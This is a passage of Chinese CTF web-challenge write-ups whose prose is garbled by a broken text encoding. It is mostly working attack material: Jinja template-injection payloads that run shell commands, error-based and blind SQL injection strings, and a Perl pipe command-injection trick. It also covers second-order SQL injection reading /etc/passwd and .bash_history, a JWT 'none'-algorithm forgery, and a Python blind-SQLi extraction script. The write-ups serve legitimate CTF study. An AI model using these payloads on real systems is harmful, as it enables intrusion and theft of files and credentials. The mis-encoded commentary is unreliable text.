&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek &#39;).read()&quot;)&#125;&#125; ä¾‹äºŒï¼š classâ€™site._Printerâ€™ç±» &#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125; è·å–flag &#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;).read()&#125;&#125; ä¾‹ä¸‰ï¼špopen &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125; &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125; &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;, [RCTF2015]EasySQLè¿™ä¹Ÿæ˜¯ä¸ªäºŒæ¬¡æ³¨å…¥ æ³¨å†Œåç™»å½•å†ä¿®æ”¹å¯†ç  åˆ©ç”¨æŠ¥é”™æ³¨å…¥ ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))# ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;))),1))# ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(flag))from(flag))),1))# ç¦»è°±ï¼Œè¢«éª—äº† é‡æ–°æŸ¥è¡¨ ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;))),1))# è¿™ä¸€çœ‹å°±æ˜¯æ²¡è¾“å‡ºå…¨ ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users))),1))# ï¼Ÿï¼Ÿï¼Ÿ è¿™ä¸ªå­—æ®µé‡ŒåŠ äº†ä¸€å †æ²¡ç”¨çš„æ•°æ® åªèƒ½ç”¨æ­£åˆ™regexpè¿‡æ»¤ä¸€ä¸‹ ethe&quot;||updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1)# è¿˜æ˜¯æ²¡è¾“å‡ºå…¨ ä¹‹åå°±è¦ç”¨é€†åºè¾“å‡ºäº† ethe&quot;||updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1)# [HITCON 2017]SSRFmeè¿›å»åæ˜¯phpä»£ç  ç›´æ¥æŠ„çš„å…¶ä»–å¸ˆå‚…çš„æ³¨é‡Š &lt;?php if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123; $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]); &#x2F;&#x2F; explode(separator,string)å‡½æ•°æŠŠä»¥separatorä¸ºåˆ†éš”å­—ç¬¦ä¸²å°†å­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ã€‚ $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $http_x_headers[0]; &#125; echo $_SERVER[&quot;REMOTE_ADDR&quot;]; $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); &#x2F;&#x2F; â€œREMOTE_ADDRâ€ä¸ºæ­£åœ¨æµè§ˆå½“å‰é¡µé¢ç”¨æˆ·çš„ IP åœ°å€ã€‚ @mkdir($sandbox); @chdir($sandbox); &#x2F;&#x2F; æ”¹å˜å½“å‰çš„ç›®å½•åˆ°$sandbox $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;])); &#x2F;&#x2F; escapeshellarg()æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•° $info &#x3D; pathinfo($_GET[&quot;filename&quot;]); &#x2F;&#x2F; pathinfo() å‡½æ•°ä»¥æ•°ç»„çš„å½¢å¼è¿”å›æ–‡ä»¶è·¯å¾„çš„ä¿¡æ¯ã€‚ $dir &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;])); &#x2F;&#x2F; basename() å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚ @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[&quot;basename&quot;]), $data); highlight_file(__FILE__); &#x2F;&#x2F; ä»¥ä¸Šä»£ç å¤§è‡´ä¸ºï¼Œè°ƒç”¨GETï¼ˆgitï¼‰å‘½ä»¤æ¥æ‰§è¡Œä»urlè·å–çš„å‚æ•°ï¼Œä»è¯¥urlè·å–å†…å®¹ï¼Œ ç„¶åæŒ‰ç…§filenameæ–°å»ºæ–‡ä»¶ï¼Œå†™å…¥gitåˆ°çš„ç»“æœã€‚ ç®€å•æ¥è¯´å°±æ˜¯åˆ©ç”¨ä¼ å‚ä¸­çš„urlæ‰§è¡Œå‘½ä»¤ï¼Œç„¶åå°†ç»“æœä¿å­˜åœ¨filenameä¸­ æœ‰å‡ ä¸ªåœ°æ–¹ä¸å¤ªæ‡‚ â€‹ 1.ç™¾åº¦çš„wpéƒ½è¯´è¿™é‡Œåˆ©ç”¨çš„perlè„šæœ¬é‡Œçš„openæ¼æ´ åˆ©ç”¨GETä¸­çš„openå‡½æ•°æ¼æ´ã€‚ openå‡½æ•°åœ¨GETå‘½ä»¤è¢«è°ƒç”¨æ—¶æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯ç¬¬äº”è¡Œæ‰§è¡ŒGETå‘½ä»¤æ—¶ï¼Œperlè¯­è¨€ä¼šè°ƒç”¨openå‘½ä»¤ï¼Œæ¼æ´å°±å­˜åœ¨äºopenå‘½ä»¤å¯¹äºæ–‡ä»¶çš„å¤„ç†ä¸Šï¼Œå…³äºè¿™ä¸ªæ¼æ´ï¼Œå¤–å›½äººæœ‰æ–‡ç« ï¼Œæ˜¯è¿™æ ·å†™çš„ï¼šPerl saw that your â€œfileâ€ ended with a â€œpipeâ€ (vertical bar) character. So it interpreted the â€œfileâ€ as a command to be executed, and interpreted the commandâ€™s output as the â€œfileâ€&#39;s contents. The command is â€œwhoâ€ (which prints information on currently logged-in users). If you execute that command, you will see that the output is exactly what the Perl program gave you. ç¿»è¯‘è¿‡æ¥æ„æ€æ˜¯ perlå‡½æ•°çœ‹åˆ°è¦æ‰“å¼€çš„æ–‡ä»¶åä¸­å¦‚æœä»¥ç®¡é“ç¬¦ï¼ˆé”®ç›˜ä¸Šé‚£ä¸ªç«–æ ï¼‰ç»“å°¾ï¼Œå°±ä¼šä¸­æ–­åŸæœ‰æ‰“å¼€æ–‡ä»¶æ“ä½œï¼Œå¹¶ä¸”æŠŠè¿™ä¸ªæ–‡ä»¶åå½“ä½œä¸€ä¸ªå‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶ä¸”å°†å‘½ä»¤çš„æ‰§è¡Œç»“æœä½œä¸ºè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹å†™å…¥ã€‚è¿™ä¸ªå‘½ä»¤çš„æ‰§è¡Œæƒé™æ˜¯å½“å‰çš„ç™»å½•è€…ã€‚å¦‚æœä½ æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œä½ ä¼šçœ‹åˆ°perlç¨‹åºè¿è¡Œçš„ç»“æœã€‚ â€‹ 2.è¿™é‡Œæ‰§è¡Œurlä¼ å…¥çš„å‘½ä»¤çš„å‰ææ˜¯è¦æ±‚æœ‰ä¸ªä»¥è¯¥å‘½ä»¤å‘½åçš„æ–‡ä»¶ ?url=/&amp;filename=1.txt çœ‹ä¸€ä¸‹æ ¹ç›®å½• æœ‰ä¸¤ä¸ªå’Œflagæœ‰å…³çš„æ–‡ä»¶ï¼Œè¯•flagæ— æœï¼Œåªèƒ½è¯•è¯•readflag ?url=&amp;filename=bash -c /readflag| å…ˆåˆ›å»ºä¸€ä¸ªbash -c /readflag|çš„æ–‡ä»¶ ?url=file:bash -c /readflag|&amp;filename=bash -c /readflag| åˆ©ç”¨urlæ‰§è¡Œå‘½ä»¤ /sandbox/md5å€¼/bash -c /readflag| [FBCTF2019]RCEService jsonæ ¼å¼ cmd å¯ä»¥çŒœåˆ°æ‰§è¡Œå‘½ä»¤æ ¼å¼æ˜¯ {&quot;cmd&quot;:&quot;ls&quot;} è¿˜å¯ä»¥ç›´æ¥getå‚æ•°è¿›å» ä½†æ˜¯catå‚æ•°æ²¡æ³•ç›´æ¥ç”¨ï¼Œè¿˜æœ‰è¿‡æ»¤ï¼Œä¸è¿‡å¯ä»¥ç”¨æ¢è¡Œç¬¦ç»•è¿‡è¿‡æ»¤ &lt;?php putenv(&#39;PATH=/home/rceservice/jail&#39;); è®¾ç½®äº†ç¯å¢ƒå˜é‡çš„PATHï¼Œå¯¼è‡´ä¸èƒ½ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œåªèƒ½ç”¨ç»å¯¹è·¯å¾„ï¼š if (isset($_REQUEST[&#39;cmd&#39;])) &#123; $json = $_REQUEST[&#39;cmd&#39;]; if (!is_string($json)) &#123; echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;; &#125; elseif (preg_match(&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/&#39;, $json)) &#123; echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;; &#125; else &#123; echo &#39;Attempting to run command:&lt;br/&gt;&#39;; $cmd = json_decode($json, true)[&#39;cmd&#39;]; if ($cmd !== NULL) &#123; system($cmd); &#125; else &#123; echo &#39;Invalid input&#39;; &#125; echo &#39;&lt;br/&gt;&lt;br/&gt;&#39;; &#125; &#125; ?&gt; catå‘½ä»¤ä¸èƒ½ç”¨ï¼ŒåŸå› å¯èƒ½æ˜¯å½“å‰çš„PATHä¸‹æ²¡æœ‰catï¼Œè¿™é‡Œéœ€è¦ä¹Ÿéœ€è¦ç”¨ç»å¯¹è·¯å¾„ï¼š Linuxå‘½ä»¤çš„ä½ç½®ï¼š/bin,/usr/binï¼Œé»˜è®¤éƒ½æ˜¯å…¨ä½“ç”¨æˆ·ä½¿ç”¨ï¼Œ/sbin,/usr/sbin,é»˜è®¤rootç”¨æˆ·ä½¿ç”¨ cat è¯»å‡ºæºç ï¼ˆæˆ‘ä¹Ÿå¾ˆæƒ³çŸ¥é“ç½‘ä¸Šçš„wpæ²¡æºç ä¹‹å‰æ€ä¹ˆæƒ³åˆ°è¿™ä¹ˆç»•è¿‡çš„ ç„¶åæ‰¾flagåœ¨çš„ç›®å½• æ‰¾åˆ°ä¹‹ååˆ©ç”¨catè¯»å‡ºæ¥ [ç½‘é¼æ¯ 2018]Commentæœ‰gitæ³„éœ²ï¼Œç”¨githackè·‘ä¸€éï¼Œç„¶ååˆ©ç”¨git log --reflogæŸ¥çœ‹å†å²æäº¤ï¼Œå†åˆ©ç”¨git resetå›æ»šç‰ˆæœ¬ï¼Œå¾—åˆ°åŸå§‹çš„ä»£ç  &lt;?php include &quot;mysql.php&quot;; session_start(); if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123; header(&quot;Location: .&#x2F;login.php&quot;); die(); &#125; if(isset($_GET[&#39;do&#39;]))&#123; switch ($_GET[&#39;do&#39;]) &#123; case &#39;write&#39;: $category &#x3D; addslashes($_POST[&#39;category&#39;]); $title &#x3D; addslashes($_POST[&#39;title&#39;]); $content &#x3D; addslashes($_POST[&#39;content&#39;]); $sql &#x3D; &quot;insert into board set category &#x3D; &#39;$category&#39;, title &#x3D; &#39;$title&#39;, content &#x3D; &#39;$content&#39;&quot;; $result &#x3D; mysql_query($sql); header(&quot;Location: .&#x2F;index.php&quot;); break; case &#39;comment&#39;: $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]); $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;; $result &#x3D; mysql_query($sql); $num &#x3D; mysql_num_rows($result); if($num&gt;0)&#123; $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;]; $content &#x3D; addslashes($_POST[&#39;content&#39;]); $sql &#x3D; &quot;insert into comment set category &#x3D; &#39;$category&#39;, content &#x3D; &#39;$content&#39;, bo_id &#x3D; &#39;$bo_id&#39;&quot;; $result &#x3D; mysql_query($sql); &#125; header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;); break; default: header(&quot;Location: .&#x2F;index.php&quot;); &#125; &#125; else&#123; header(&quot;Location: .&#x2F;index.php&quot;); &#125; ?&gt; è¾“å…¥çš„å†…å®¹éƒ½è¢«addslashesè¿‡æ»¤äº†ï¼Œä½†æ˜¯å†commentéƒ¨åˆ†ï¼Œcategoryæ˜¯ç›´æ¥ä»æ•°æ®åº“ä¸­è°ƒå‡ºæ¥çš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œå­˜åœ¨äºŒæ¬¡æ³¨å…¥ åœ¨å‘å¸–éƒ¨åˆ†ï¼šçš„categoryé‡Œè¾“å…¥x&#39;,content=database(),/* å†åœ¨æäº¤ç•™è¨€é‡Œ è¿™æ ·å¯ä»¥å½¢æˆå¤šè¡Œæ³¨é‡Šï¼Œæ³¨é‡Šæ‰åŸæœ‰çš„contentå­—æ®µ å¯ä»¥å¾—åˆ°æ•°æ®åº“åç§° è¿™æ—¶æŸ¥è¯¢è¯­å¥ä¸º $sql &#x3D; &quot;insert into comment set category &#x3D; &#39;x&#39;,content&#x3D;database(),&#x2F;*&#39;, content &#x3D; &#39;*&#x2F;#&#39;, bo_id &#x3D; &#39;$bo_id&#39;&quot;; å³ $sql &#x3D; &quot;insert into comment set category &#x3D; &#39;x&#39;,content&#x3D;database(), bo_id &#x3D; &#39;$bo_id&#39;&quot;; SQLè¯»å–æ–‡ä»¶ç”¨load_file()å‡½æ•°è¿›è¡Œè¯»å–ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯è¯»å–æ–‡ä»¶å¹¶è¿”å›æ–‡ä»¶å†…å®¹ä¸ºå­—ç¬¦ä¸²ã€‚è¦ä½¿ç”¨æ­¤å‡½æ•°ï¼Œæ–‡ä»¶å¿…é¡»ä½äºæœåŠ¡å™¨ä¸»æœºä¸Šï¼Œå¿…é¡»æŒ‡å®šå®Œæ•´è·¯å¾„çš„æ–‡ä»¶ï¼Œè€Œä¸”å¿…é¡»æœ‰FILEæƒé™ã€‚ è¯¥æ–‡ä»¶æ‰€æœ‰å­—èŠ‚å¯è¯»ï¼Œä½†æ–‡ä»¶å†…å®¹å¿…é¡»å°äºmax_allowed_packetã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨æˆ–æ— æ³•è¯»å–ï¼Œå› ä¸ºå‰é¢çš„æ¡ä»¶ä¹‹ä¸€ä¸æ»¡è¶³ï¼Œå‡½æ•°è¿”å› NULLã€‚ .bash_history .bash_historyä¸ºåœ¨unix/linuxç³»ç»Ÿä¸‹ä¿å­˜å†å²å‘½ä»¤çš„æ–‡ä»¶ï¼Œåœ¨ç”¨æˆ·çš„æ ¹ç›®å½•ä¸‹ï¼Œå³~/å¤„ã€‚ .DS_Storeæ–‡ä»¶æ³„éœ² æ–‡ä»¶æ³„éœ²ï¼Œæœ‰ä¸€ä¸ªä¸‹è½½è‡³æœ¬åœ°çš„è„šæœ¬ï¼Œä¸è¿‡è¿™é¢˜ç”¨ä¸ä¸Šã€‚ åœ¨å‘å¸–ä¹‹å‰è¿˜æœ‰ä¸ªç™»å½•ç•Œé¢ï¼Œç”¨æˆ·åå’Œå¯†ç å‰å‡ ä½ç›´æ¥ç»™äº†ï¼Œå‰©ä¸‹ä¸‰ä½çˆ†ç ´å¾—åˆ°666 &#39;,content=(select(load_file(&quot;/etc/passwd&quot;))),/* ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“æŸ¥è¿™é‡Œçš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯ç™¾åº¦å…¶ä»–å¸ˆå‚…çš„wpéƒ½æœ‰è¿™æ­¥ åº”è¯¥æ˜¯ä¸ºäº†çŸ¥é“.bash_histroyæ–‡ä»¶çš„è·¯å¾„ &#39;,content=(select(load_file(&quot;/home/www/.bash_history&quot;))),/* æ¥ç€å†æŸ¥.DS_Store &#39;,content=(select hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/* ä¸ºäº†ä½¿å…¶å…¨éƒ¨æ˜¾ç¤ºï¼Œè¦ç”¨hexç¼–ç  ç„¶åè§£ç  çœ‹è§æœ‰ä¸ªflagæ–‡ä»¶ è¯»ä¸€ä¸‹ &#39;,content=(select hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;))),/* å†è§£ç ï¼Œæ‹¿åˆ°flag [HFCTF2020]EasyLoginæ³¨å†Œä¸ªè´¦å·ï¼Œç™»å½•ï¼Œçœ‹åˆ°æœ‰ä¸ªgetflagä½†æ˜¯æç¤ºæƒé™ä¸å¤Ÿ æŸ¥çœ‹æºç å‘ç°å…¨æ˜¯jsçš„ çœ‹ä¸€ä¸‹app.js &#x2F;** * æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶ * è·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD *&#x2F; function login() &#123; const username &#x3D; $(&quot;#username&quot;).val(); const password &#x3D; $(&quot;#password&quot;).val(); const token &#x3D; sessionStorage.getItem(&quot;token&quot;); $.post(&quot;&#x2F;api&#x2F;login&quot;, &#123;username, password, authorization:token&#125;) .done(function(data) &#123; const &#123;status&#125; &#x3D; data; if(status) &#123; document.location &#x3D; &quot;&#x2F;home&quot;; &#125; &#125;) .fail(function(xhr, textStatus, errorThrown) &#123; alert(xhr.responseJSON.message); &#125;); &#125; function register() &#123; const username &#x3D; $(&quot;#username&quot;).val(); const password &#x3D; $(&quot;#password&quot;).val(); $.post(&quot;&#x2F;api&#x2F;register&quot;, &#123;username, password&#125;) .done(function(data) &#123; const &#123; token &#125; &#x3D; data; sessionStorage.setItem(&#39;token&#39;, token); document.location &#x3D; &quot;&#x2F;login&quot;; &#125;) .fail(function(xhr, textStatus, errorThrown) &#123; alert(xhr.responseJSON.message); &#125;); &#125; function logout() &#123; $.get(&#39;&#x2F;api&#x2F;logout&#39;).done(function(data) &#123; const &#123;status&#125; &#x3D; data; if(status) &#123; document.location &#x3D; &#39;&#x2F;login&#39;; &#125; &#125;); &#125; function getflag() &#123; $.get(&#39;&#x2F;api&#x2F;flag&#39;).done(function(data) &#123; const &#123;flag&#125; &#x3D; data; $(&quot;#username&quot;).val(flag); &#125;).fail(function(xhr, textStatus, errorThrown) &#123; alert(xhr.responseJSON.message); &#125;); &#125; æç¤ºæ˜¯åŸºäºNode.jsçš„koaæ¡†æ¶ï¼Œä½†æ˜¯è¿™ä¸ªé¡µé¢çš„ä»£ç å¹¶ä¸æ˜¯é€»è¾‘ä»£ç ï¼Œç”¨å¤„ä¸å¤§ã€‚åœ¨æ³¨é‡Šé‡Œæç¤ºé™æ€æ–‡ä»¶å¤„ç†å‡ºç°é—®é¢˜ï¼Œé‚£ä¹ˆå¯èƒ½ä¼šå‡ºç°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ è¿™é‡Œéœ€è¦å¯¹koaæ¡†æ¶çš„ç›®å½•æœ‰ä¸€å®šçš„äº†è§£ è®¿é—®ä¸€ä¸‹controllersè·¯å¾„ä¸‹çš„api.js é¢ï¼Œè¿™é‡Œèµµæ€»è¯´æ˜¯ç»éªŒã€‚ã€‚ã€‚ const crypto &#x3D; require(&#39;crypto&#39;); const fs &#x3D; require(&#39;fs&#39;) const jwt &#x3D; require(&#39;jsonwebtoken&#39;) const APIError &#x3D; require(&#39;..&#x2F;rest&#39;).APIError; module.exports &#x3D; &#123; &#39;POST &#x2F;api&#x2F;register&#39;: async (ctx, next) &#x3D;&gt; &#123; const &#123;username, password&#125; &#x3D; ctx.request.body; if(!username || username &#x3D;&#x3D;&#x3D; &#39;admin&#39;)&#123; throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;); &#125; if(global.secrets.length &gt; 100000) &#123; global.secrets &#x3D; []; &#125; const secret &#x3D; crypto.randomBytes(18).toString(&#39;hex&#39;); const secretid &#x3D; global.secrets.length; global.secrets.push(secret) const token &#x3D; jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#39;HS256&#39;&#125;); ctx.rest(&#123; token: token &#125;); await next(); &#125;, &#39;POST &#x2F;api&#x2F;login&#39;: async (ctx, next) &#x3D;&gt; &#123; const &#123;username, password&#125; &#x3D; ctx.request.body; if(!username || !password) &#123; throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;); &#125; const token &#x3D; ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid &#x3D; JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid; console.log(sid) if(sid &#x3D;&#x3D;&#x3D; undefined || sid &#x3D;&#x3D;&#x3D; null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;&#x3D; 0)) &#123; throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;); &#125; const secret &#x3D; global.secrets[sid]; const user &#x3D; jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;); const status &#x3D; username &#x3D;&#x3D;&#x3D; user.username &amp;&amp; password &#x3D;&#x3D;&#x3D; user.password; if(status) &#123; ctx.session.username &#x3D; username; &#125; ctx.rest(&#123; status &#125;); await next(); &#125;, &#39;GET &#x2F;api&#x2F;flag&#39;: async (ctx, next) &#x3D;&gt; &#123; if(ctx.session.username !&#x3D;&#x3D; &#39;admin&#39;)&#123; throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;); &#125; const flag &#x3D; fs.readFileSync(&#39;&#x2F;flag&#39;).toString(); ctx.rest(&#123; flag &#125;); await next(); &#125;, &#39;GET &#x2F;api&#x2F;logout&#39;: async (ctx, next) &#x3D;&gt; &#123; ctx.session.username &#x3D; null; ctx.rest(&#123; status: true &#125;) await next(); &#125; &#125;; èµµæ€»wpé‡Œçš„å®¡è®¡: æ³¨å†Œ /api/registerï¼Œæ¥å—ä¼ å…¥çš„ username å’Œ passwordï¼Œå…ˆåˆ¤æ–­ username ä¸ä¸º adminï¼Œç„¶åç”Ÿæˆä¸€ä¸ª key æ¥ä»¥è¿™äº›ä¿¡æ¯ä¸ºä¾æ®ï¼Œç”Ÿæˆä¸€ä¸ª jwt ä»¤ç‰Œï¼Œkey åŒæ—¶å­˜å…¥å…¨å±€æ•°ç»„ã€‚ ç™»å½• /api/loginï¼Œæ¥å—ä¼ å…¥çš„ username å’Œ passwordï¼Œç„¶åä»ä»¤ç‰Œçš„ä¿¡æ¯æ®µä¸­å– key çš„ idï¼Œä»ç¨‹åºä¸­çš„å…¨å±€æ•°ç»„å–å‡º keyï¼Œç„¶åè¿›è¡ŒéªŒè¯ï¼ŒéªŒè¯é€šè¿‡ä¹‹åç½® session ä¸­çš„ username ä¸ºç™»å½•æ—¶ä½¿ç”¨çš„ usernameã€‚ è·å–FLAG /api/flagï¼Œåˆ¤æ–­ session ä¸­çš„ç”¨æˆ·åæ˜¯å¦ä¸º adminï¼Œæ˜¯çš„è¯å°±ç›´æ¥ç»™ flagã€‚ å¯ä»¥çœ‹åˆ°ä¿¡æ¯æ˜¯ç”¨ jwt ä»¤ç‰Œå‚¨å­˜çš„ï¼Œä½¿ç”¨ jsonwebtoken åº“æ¥æ“ä½œï¼Œè¿™é‡Œç”¨çš„æ˜¯ HS256åŠ å¯†ï¼Œä½†ç»è¿‡æµ‹è¯•å‘ç°ï¼Œå½“åŠ å¯†æ—¶ä½¿ç”¨çš„æ˜¯ none æ–¹æ³•ï¼ŒéªŒè¯æ—¶åªè¦å¯†é’¥å¤„ä¸º undefined æˆ–è€…ç©ºä¹‹ç±»çš„ï¼Œå³ä¾¿åé¢çš„ç®—æ³•æŒ‡åä¸º HS256ï¼ŒéªŒè¯ä¹Ÿè¿˜æ˜¯æŒ‰ç…§ none æ¥éªŒè¯é€šè¿‡ï¼Œè¿™æ ·å¾ˆè½»æ¾åœ°å°±å¯ä»¥ä¼ªé€ ä¸€ä¸ª username ä¸º admin çš„ jwttoken äº†ã€‚ åœ¨ç™»å½•ç•Œé¢æŠ“åŒ…åè¾¹è¿™ä¸²å°±æ˜¯jwtï¼ˆå½“æ—¶å¿˜äº†æˆªå›¾ï¼Œè¿™æ˜¯æ”¹å®Œjwtä¹‹åçš„äº† ä¹‹ååœ¨JSON Web Tokens - jwt.ioé‡Œè§£ç  æ¥ä¸‹æ¥ä¹Ÿæ˜¯èµµæ€»çš„åˆ†æï¼š å›åˆ°æºç¨‹åºé€»è¾‘ä¸­ï¼Œè‹¥æƒ³è®©è¿™é‡Œçš„å¯†é’¥ keyä¸ºç©ºï¼Œå°±éœ€è¦ä¿®æ”¹ä¸Šé¢çš„ secretidã€‚é‚£ä¹ˆå°±å°è¯•ä¿®æ”¹ secretidï¼Œä½¿å…¶æ— æ³•ä½œä¸ºå…¨å±€å˜é‡ secrets æ•°ç»„çš„ç´¢å¼•ï¼Œé‚£ä¹ˆ secret å°±ä¼šä¸ºç©ºäº†ã€‚ æ³¨æ„ï¼Œè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªéªŒè¯ï¼Œè¦æ±‚ sid ä¸èƒ½ä¸º undefinedï¼Œnullï¼Œå¹¶ä¸”å¿…é¡»åœ¨å…¨å±€å˜é‡ secrets æ•°ç»„çš„é•¿åº¦å’Œ 0 ä¹‹é—´ã€‚ä¹çœ‹ä¹‹ä¸‹æ²¡æœ‰æ“ä½œç©ºé—´ï¼Œæ€ä¹ˆæ•´éƒ½ä¼šå–å‡º å¯†é’¥ keyã€‚ä½†åˆ«å¿˜äº† JavaScript æ˜¯ä¸€é—¨å¼±ç±»å‹è¯­è¨€ï¼ŒNodeJS éƒ½æ˜¯ JS çš„è¯­æ³•ï¼Œé‚£è‡ªç„¶ä¹Ÿæ˜¯å’¯ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦é€‰æ‹©æ°å½“çš„æ•°æ®æ¥ç»•è¿‡è¿™ä¸ªåˆ¤æ–­å³å¯ã€‚å¯ä»¥åšä¸€ä¸ªå°å®éªŒæ¥éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•ã€‚ ä¸€ä¸ªå°å®éªŒï¼Œç©ºæ•°ç»„ä¸æ•°å­—æ¯”è¾ƒæ°¸è¿œä¸ºçœŸï¼Œå½“ç„¶ç”¨ç©ºå­—ç¬¦ä¸²ä¹‹ç±»çš„ä¹Ÿå¯ä»¥ æœ€ååˆ©ç”¨pythonçš„PyJWTåº“æ¥åŠ å¯† æŠ“åŒ…å†æ”¾åŒ…å°±å¯ä»¥è¯»å–è¿™ä¸ªflag è™ç¬¦ CTF Web éƒ¨åˆ† Writeup â€“ glzjin (zhaoj.in) [GYCTF2020]Ezsqliorè¢«è¿‡æ»¤äº†ï¼Œæ²¡æ³•ç”¨informationæŸ¥è¡¨äº†ï¼Œä½†æ˜¯å¯ä»¥ç”¨ 1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),1,1))&#x3D;103 2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;.format() æ­£ç¡®çš„æ—¶å€™è¿”å›Nu1Lï¼Œé”™è¯¯æ—¶è¿”å›V&amp;N çˆ†è¡¨è„šæœ¬ import requests url &#x3D; &quot;http:&#x2F;&#x2F;c581ac4d-17cf-437c-abc6-b0153526b868.node4.buuoj.cn:81&#x2F;&quot; payload &#x3D; &#39;2||ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;&#39; database&#x3D; &#39;&#39; for i in range(1,1000): low &#x3D; 32 heigh &#x3D; 128 mid &#x3D; (low + heigh) &#x2F;&#x2F; 2 while (low &lt; heigh): payload1 &#x3D; payload.format(i,mid) post_data &#x3D; &#123;&#39;id&#39;: payload1&#125; r &#x3D; requests.post(url,data&#x3D;post_data) print(payload1) if &quot;Nu1L&quot; in r.text: low &#x3D; mid + 1 else: heigh &#x3D; mid mid &#x3D; (low + heigh) &#x2F;&#x2F; 2 if mid &#x3D;&#x3D; 32: break database +&#x3D;chr(mid) print(database) 